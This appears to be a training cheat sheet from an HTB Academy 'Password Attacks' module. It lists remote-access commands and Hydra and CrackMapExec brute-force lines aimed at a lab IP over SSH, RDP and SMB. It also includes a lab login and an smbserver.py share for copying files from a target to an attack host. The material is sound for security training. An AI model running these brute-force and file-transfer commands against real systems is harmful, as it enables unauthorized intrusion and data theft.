# Password Attacks

<figure><img src=".gitbook/assets/Untitled (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## **Network Services**

| Command                                                                                          | Description                                                                                                                                                            |
| ------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| xfreerdp /v:\<ip> /u:htb-student /p:HTB\_@cademy\_stdnt!                                         | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol.                                                                                  |
| evil-winrm -i \<ip> -u user -p password                                                          | Uses Evil-WinRM to establish a Powershell session with a target.                                                                                                       |
| ssh user@\<ip>                                                                                   | Uses SSH to connect to a target using a specified user.                                                                                                                |
| smbclient -U user \\\\\\\\\<ip>\\\SHARENAME                                                      | Uses smbclient to connect to an SMB share using a specified user.                                                                                                      |
| python3 [smbserver.py](http://smbserver.py) -smb2support CompData /home/\<nameofuser>/Documents/ | Uses [smbserver.py](http://smbserver.py) to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host. |

* `CrackMapExec` (no longer maintained) `netexec` is recommended
  * `crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>` `crackmapexec winrm 10.129.42.197 -u user.list -p password.list` to get username and password
  * `crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares` to view available shares and what privileges we have
* **`Evil-WinRM` communicate with `winrm` service**
  * `evil-winrm -i <target-IP> -u <username> -p <password` if credentials are correct, terminal session is initialized using PowerShell Remoting Protocol (MS-PSRP)
* `Hydra` brute forcing tool
  * `hydra -L user.list -P password.list ssh://10.129.42.197`
  * `hydra -L user.list -P password.list rdp://10.129.42.197`
  * `hydra -L user.list -P password.list smb://10.129.42.197`

